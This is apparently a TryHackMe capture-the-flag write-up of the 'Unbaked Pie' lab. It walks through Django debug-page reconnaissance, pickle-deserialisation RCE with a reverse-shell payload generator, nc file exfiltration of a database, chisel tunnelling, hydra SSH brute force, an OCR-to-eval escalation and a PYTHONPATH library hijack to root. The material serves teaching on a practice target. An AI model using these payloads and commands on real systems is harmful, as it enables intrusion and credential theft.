# Unbaked Pie TryHackMe WriteUp
### Machine IP: 10.112.184.156  

----
First of all, as usual I made a port scan:  
```bash  
rustscan -a 10.112.184.156  
```
I saw that only the port (5003) is open. Let's look at the web-site. I saw "search", "login", "signup" pages and some posts.    
I also got three usernames, maybe they can be useful for us: [ramsey], [wan], [oliver]. I decided to do directory scan:  
```bash
ffuf -u http://10.112.184.156:5003/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
```
Actually, I didn't get any important info from there. I thought that there isn't anything I can try so lets explore the sign in page.    
When I write default credentials on there, like (admin:admin) I saw an error message:    
|    
<img width="1929" height="418" alt="Screenshot From 2026-02-23 20-12-49" src="https://github.com/user-attachments/assets/64b0b2ea-09d8-4b21-8518-bd02ff160b1b" />    
|    
Hmm, This is a significant Information Leakage vulnerability. The verbosity of the error confirms two things:  

    Backend Technology: The syntax %(username)s is a classic Python string formatting style, confirming the backend is likely running Django or a similar Python framework.

    Username Enumeration: The system explicitly distinguishes between an "invalid login" and an "inactive account." This allows an attacker to brute-force usernames to identify which accounts actually exist on the system.  

----
### Information Gathering via Debug Mode  
The detailed JSON error messages I received suggested that the application was running in Debug Mode. In a live environment, these technical details should be hidden to prevent leaking the app's internal logic.  

To test this, I tried to access a non-existent page (like /random_123). Instead of a standard "Not Found" error, the server returned a 404 Debug Page. This page is a goldmine for an attacker because it reveals:  

    File Paths: Exactly where the application files are stored on the server.

    URL Patterns: A complete list of all available pages and hidden API endpoints.

    System Info: The specific Python modules and versions being used.

Lets try /test/ folder in there:    
|    
<img width="1769" height="701" alt="Screenshot From 2026-02-23 20-32-48" src="https://github.com/user-attachments/assets/477c5728-b29a-45e3-8748-dae68d02454e" />  
|   
As you can see, "DEBUG = True" prove that the website uses python, django.   
The Django debug page provided a complete list of URL patterns, effectively eliminating the need for directory brute-forcing. I identified several high-interest endpoints:   

    /admin/: Potential for administrative access.

    /accounts/: Useful for username enumeration based on the verbose error messages found earlier.

    /share/: A potential entry point for file uploads or resource sharing.

    /search/: An entry point for testing injection vulnerabilities.
    This exposure significantly reduced the time required for the reconnaissance phase.
I controlled these URL's, and at the end decided to look at http request while searching someting. I used Burp Suite for this.    
|    
<img width="1596" height="589" alt="Screenshot From 2026-02-23 20-38-16" src="https://github.com/user-attachments/assets/ac7b2366-171c-404c-a4cf-230a4bc059ab" />  
|    
The http request looks like this:  
```bash
POST /search HTTP/1.1
Host: 10.112.184.156:5003
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.112.184.156:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Origin: http://10.112.184.156:5003
Connection: keep-alive
Cookie: csrftoken=TbFx2hfZlh2kqKtyKWQWJfkKWBJQom4QnbQfyZAqJ7TYDVD7ItqfRWpi2YgpqDEy; search_cookie="gASVCQAAAAAAAACMBWhlbGxvlC4="
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrfmiddlewaretoken=P4beGfdvc1UrDpYKS9DDG8jkkaElbbEij4mWcXyWARL5QA8jQGdWOPoSqxbUdse0&query=test
```
While intercepting the /search request in Burp Suite, I noticed a very suspicious cookie named search_cookie:  
```bash
search_cookie="gASVCQAAAAAAAACMBWhlbGxvlC4="
```
It looked like a base64 code. So when I decoded it on terminal by writing:    
"echo 'gASVCQAAAAAAAACMBWhlbGxvlC4=' | base64 -d" , I saw that It returns me some unreadable symbols and the word "test" which I searched for. I searched about this search_cookie and learned that -> The prefix gASV is a classic signature of a Python Pickle object (Protocol 3/4). The presence of a Pickle object in a cookie is a massive red flag. Python's pickle module is notoriously insecure because it can be used to execute arbitrary code during the deserialization process.   

If the web application takes this cookie and runs pickle.loads() on it to retrieve the search history, we can replace the cookie with a malicious Pickle payload. This would allow us to achieve Remote Code Execution (RCE) on the server.    
I created a malicious python code to get RCE:  
```bash
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        ip = "YOUR_IP" 
        port = "4444"
        cmd = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled).decode())
```
It gave a a search_cookie like this:    
"gASV6wAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjNBweXRob24zIC1jICdpbXBvcnQgc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxOTIuMTY4LjEzNy42OCIsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3B0eS5zcGF3bigiL2Jpbi9iYXNoIiknlIWUUpQu"    

----
When I paste it into the "search-cookie" parameter on burpsuite and sent, I got a shell:    
|  
<img width="1039" height="168" alt="Screenshot From 2026-02-23 20-49-37" src="https://github.com/user-attachments/assets/3b4a72bd-b5b3-4d4e-8e60-9eeec578c6c7" />   
|  
When I accessed as root, I saw that there is a database file on /home/site/ folder which has a name "db.sqlite3". I used nc to get this file to my terminal and tried to read it.   
```bash
On my kali: nc -lvnp 9999 > db.sqlite3
On target:  nc -v 192.168.137.68 9999 < db.sqlite3
```
After this, on my terminal, I read the user credentials:  
```bash
sqlite3 db.sqlite3
.tables
SELECT username, password FROM auth_user;
```
|  
<img width="1228" height="529" alt="Screenshot From 2026-02-23 21-03-21" src="https://github.com/user-attachments/assets/971469ee-2138-428a-8156-0c7a80edb72d" />  
|   
I found so much credential but none of them are decrypted by the john. I couldn't do it. So, lets try another ways on target machine. I accessed the /root/ folder and read the .bash_history file which will give sensitive data to us. I saw a ssh connection in there:  
```bash
ssh ramsey@172.17.0.1
```

----

Neither ssh nor socat are installed on the docker container. Let’s use chisel. If you don't have, you can install and configure it like this:  
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel
```
Then, let's send thr chisel to the target terminal:  
```bash
On my kali: python3 -m http.server 80
On target:  wget http://192.168.137.68/chisel -O /tmp/chisel
```
Before starting, I want to give some information about chisel:  
Chisel is a tool used in cyber-security to create fast tunnels between computers using HTTP. Simply put, it opens a "tunnel" between two machines so they can talk to each other even if there is a firewall in the way.  
How does it work?  

Chisel works with a Client-Server logic:  

    Server: The side that waits for the connection (usually you, the attacker).

    Client: The side that starts the connection (usually the target machine).

Example Scenario:  

You want to see a website running on port 8000 inside the target machine, but you cannot access it from the outside.  

    On your machine (Kali):
    ./chisel server -p 9000 --reverse
    (This starts the server on port 9000 and waits for the target).

    On the target machine:
    ./chisel client <your_ip>:9000 R:8000:127.0.0.1:8000
    (This connects the target's port 8000 to your port 8000 through the tunnel).

---- 
Let's do it.    
#### On my kali:  
```bash
./chisel server --reverse -p 8888
```
./chisel server: This tells your computer to act as the listener (the host) that waits for a connection.  

--reverse: This allows the target to create a tunnel back to you. It is the most common way to bypass firewalls.  

-p 8888: This sets 8888 as the communication port where the two computers will meet.  

#### On target machine:  
```bash
chmod +x /tmp/chisel
./tmp/chisel client 192.168.137.68:8888 R:2222:172.17.0.1:22
```

#### On another kali terminal  
```bash
hydra -l 'ramsey' -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2222 -t 4
```
Yeahh, we got the password:    
|  
<img width="1589" height="363" alt="Screenshot From 2026-02-23 21-27-59" src="https://github.com/user-attachments/assets/2996a8a1-2e3b-4111-81db-16974ddf6517" />   
|   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ ssh ramsey@127.0.0.1 -p 2222
ramsey@unbaked:~$ 
```
I am in!!!!!. I got the USER FLAG from there. I saw a file which is very suspicious:    
-rw-r--r-- 1 root   ramsey 4369 Oct  3  2020 vuln.py    
Lets check "sudo -l".    
(oliver) /usr/bin/python /home/ramsey/vuln.py  -->  It means we can execute this command as oliver user.   So, our new goal is to get oliver's account. There is a vulnerability in this pytohon code:  
```bash
LISTED = pytesseract.image_to_string(Image.open('payload.png')) 
TOTAL = eval(LISTED)
```
In Python, the eval() function takes a string and runs it as live Python code. It is dangerous because if a programmer allows a user to control that string, the user can run any command they want on the system. This leads to a vulnerability called RCE (Remote Code Execution).  
2. How the vulnerability works (The Flow)  

Looking at the code, here is the process:  

    Step 1: The program uses pytesseract to read the text inside a file named payload.png.

    Step 2: The text found in the image is saved into a variable called LISTED.

    Step 3 (The Critical Error): The program runs eval(LISTED). This means it executes whatever text was written in the image as a real Python command.

I made a python code to create this image.  
```bash
from PIL import Image, ImageDraw, ImageFont
text = "os.system('/bin/bash')"

img = Image.new('RGB', (1000, 300), color=(255, 255, 255))
d = ImageDraw.Draw(img)

try:
    font = ImageFont.truetype("/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf", 60)
except:
    font = ImageFont.load_default()
d.text((50, 100), text, fill=(0, 0, 0), font=font)

img.save('payload.png')
print("payload.png was created!")
```
After executing it on my kali, the malicious png file was created. Now I opened a python connection and send it to the target.  
```bash
On my kali: python3 -m http.server 2020
On target:  wget http://192.168.137.68:2020/payload.png
```
After ensuring that both "payload.png" and "vuln.py" are in the same folder, just execute this command to get oliver user's account:      
```bash
sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
```

----
# Privilege Escalation  
Yah, we are oliver right now. The first thing I had to do was to check "sudo -l".   
```bash
(root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
```
Lets look at its permission and content:  
```bash
oliver@unbaked:~$ ls -l /opt/dockerScript.py
-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py


oliver@unbaked:~$ cat /opt/dockerScript.py
import docker
# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
```

1. Where is the vulnerability?  
The vulnerability is called Python Library Hijacking.  
  
Look at the first line of the script: import docker. When Python tries to find a library (like docker), it first looks in the current folder where you are working. If you create a file named docker.py in that same folder, Python will run your file instead of the real library.  
  
2. Why Oliver?  
The comment in the code specifically mentions Oliver: "oliver, make sure to restart docker...". This is a big hint. It means Oliver has the permission to run this script. If Oliver can run this script with higher privileges (like sudo), you can use your fake docker.py to "hijack" that power and become a more powerful user. Let's create this fake docker.py file to be root.  
  
```bash
echo "import pty; pty.spawn('/bin/bash')" > /home/oliver/docker.py
sudo PYTHONPATH=/home/oliver /usr/bin/python /opt/dockerScript.py
```
Bingooo!!! I am root right now. Lets read the root.txt flag and finish the CTF.  



















